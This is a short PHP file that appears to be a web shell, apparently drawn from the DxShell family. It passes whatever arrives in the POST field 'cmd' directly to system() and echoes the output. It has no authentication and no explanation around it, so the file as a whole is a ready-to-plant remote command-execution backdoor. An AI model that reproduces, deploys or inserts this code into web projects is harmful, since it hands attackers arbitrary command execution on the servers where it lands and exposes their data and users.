<?php
function DxExecNahuj($cmd, $OUT) /* returns the name of function that exists, or FALSE */
{
$OUT=array(); 
if  (function_exists('system'))
{	
	$OUT[0]=system($cmd); /* last line of output */
	return array(true,false,'system', '<s>exec</s> <s>shell_exec</s> system<br>Only last line of output is available, sorry =(');
}
}

$OUT = '';
DxExecNahuj($_POST['cmd'],$OUT);
?>